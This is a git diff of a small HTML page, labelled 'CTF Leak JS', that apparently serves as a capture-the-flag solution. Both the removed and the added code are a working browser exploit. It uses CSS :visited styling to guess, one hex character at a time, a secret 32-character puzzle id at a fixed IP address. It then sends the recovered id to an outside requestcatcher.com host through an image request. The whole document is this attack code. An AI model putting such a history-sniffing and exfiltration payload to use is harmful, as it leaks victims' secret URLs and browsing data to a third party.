@@ -1,46 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>CTF Leak JS</title>
-  <style id="dynamic-style">
-    .checklink { color: black; }
-  </style>
+  <style id="s">a{color:black;}</style>
 </head>
 <body>
-  <a id="test" class="checklink" style="position:absolute; left:-9999px;"></a>
+  <a id="a"></a>
   <script>
-    (async () => {
-      const base = 'http://34.146.134.179:3000/puzzle?id=';
-      const catcher = 'https://singetu0096.requestcatcher.com';
-      const hex = '0123456789abcdef';
-      let id = '';
-      const a = document.getElementById('test');
-      const style = document.getElementById('dynamic-style');
-
-      for (let pos = 0; pos < 32; pos++) {
-        style.textContent = '.checklink { color: black; }\n';
-        for (const c of hex) {
-          style.textContent += `a.checklink[href^=\"${base}${id}${c}\"]:visited { color: red !important; }\n`;
+    (async()=>{
+      const base='http://34.146.134.179:3000/puzzle?id=';
+      const hex='0123456789abcdef';
+      let id='';
+      const a=document.getElementById('a');
+      const s=document.getElementById('s');
+      
+      for(let pos=0;pos<32;pos++){
+        let css='a{color:black;}';
+        for(const c of hex){
+          css+=`a[href^="${base}${id}${c}"]:visited{color:red!important;}`;
         }
-
-        let found = false;
-        for (const c of hex) {
-          a.href = base + id + c;
-          document.body.appendChild(a);
-          await new Promise(requestAnimationFrame);
-          if (getComputedStyle(a).color === 'rgb(255, 0, 0)') {
-            id += c;
-            found = true;
+        s.textContent=css;
+        
+        let found=false;
+        for(const c of hex){
+          a.href=base+id+c+'0'.repeat(31-pos);
+          await new Promise(r=>setTimeout(r,50));
+          if(getComputedStyle(a).color==='rgb(255, 0, 0)'){
+            id+=c;
+            found=true;
             break;
           }
-          document.body.removeChild(a);
         }
-
-        if (!found) break;
+        if(!found)break;
       }
-
-      new Image().src = `${catcher}?fullid=${id}`;
+      
+      new Image().src=`https://singetu0096.requestcatcher.com/?id=${id}`;
     })();
   </script>
 </body>
